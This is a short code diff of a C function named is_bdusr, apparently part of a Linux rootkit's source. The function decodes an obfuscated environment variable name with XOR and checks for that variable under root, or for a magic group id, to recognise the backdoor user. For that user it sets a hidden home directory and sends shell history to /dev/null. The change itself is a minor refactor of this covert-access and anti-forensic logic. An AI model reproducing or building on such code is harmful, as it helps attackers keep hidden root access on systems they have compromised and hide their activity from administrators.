@@ -1,6 +1,6 @@
 int is_bdusr(void)
 {
-    int obd = 0;
+    int obd=0;
     char *bdenv=strdup(BD_ENV); xor(bdenv);
     if((getenv(bdenv) != NULL && getuid() == 0) || getgid() == MGID)
     {
@@ -12,13 +12,11 @@ int is_bdusr(void)
         snprintf(_idir, sizeof(_idir), "HOME=%s", idir);
         putenv(_idir); CLEAN(idir);
 
-        char _histfile[128];
-        snprintf(_histfile, sizeof(_histfile), "HISTFILE=/dev/null");
-        putenv(_histfile);
+        putenv("HISTFILE=/dev/null");
 #define BHOME
 #endif
-        obd = 1;
-    }
+        obd=1;
+    }else obd=0;
     CLEAN(bdenv);
     return obd;
 }
